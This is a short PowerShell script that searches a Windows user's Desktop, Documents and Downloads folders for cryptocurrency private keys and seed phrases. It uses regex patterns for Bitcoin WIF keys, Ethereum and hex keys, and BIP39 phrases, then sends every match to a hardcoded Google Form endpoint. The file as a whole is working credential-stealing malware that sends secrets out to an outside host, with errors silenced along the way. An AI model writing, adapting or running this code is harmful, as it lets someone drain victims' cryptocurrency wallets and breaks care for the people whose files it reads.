# Define search locations (excluding AppData for now to avoid freezing)
$locations = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
)

# Define file extensions to scan
$fileTypes = '*.txt', '*.json', '*.log', '*.conf'

# Regex patterns for private keys and seed phrases
$patterns = @(
    '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b',         # Bitcoin WIF
    '\b0x[a-fA-F0-9]{64}\b',                        # Ethereum private key
    '\b[a-fA-F0-9]{64}\b',                          # Raw hex private key
    '\b(?:\w+\b[\s,]*){12,24}'                      # BIP39 seed phrases
)

# Max file size in bytes (5MB)
$maxFileSize = 5MB

# Google Form details
$formUrl = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdm5XuNDe2EVDC0NHMGJfiC35nh6_5kkXVY550Wc4HbHVT5cA/formResponse"
$fieldName = "entry.448178314"

$results = @()

# Start scanning
foreach ($location in $locations) {
    Write-Host "Scanning in: $location"
    Get-ChildItem -Path $location -Recurse -Include $fileTypes -ErrorAction SilentlyContinue -Force | Where-Object {
        -not $_.PSIsContainer -and $_.Length -lt $maxFileSize
    } | ForEach-Object {
        $file = $_.FullName
        foreach ($pattern in $patterns) {
            try {
                $matches = Select-String -Path $file -Pattern $pattern -AllMatches -ErrorAction Stop
                foreach ($match in $matches) {
                    $results += $match.Matches.Value
                }
            } catch {
                # Skip unreadable files
            }
        }
    }
}

# Remove duplicates
$results = $results | Sort-Object -Unique

# Send each result to Google Form
foreach ($result in $results) {
    try {
        $body = @{ $fieldName = $result }
        Invoke-WebRequest -Uri $formUrl -Method POST -Body $body -ErrorAction SilentlyContinue | Out-Null
    } catch {
        Write-Host "❌ Failed to send: $result"
    }
}

Write-Host "`n✅ Scan complete. Total submitted: $($results.Count)"
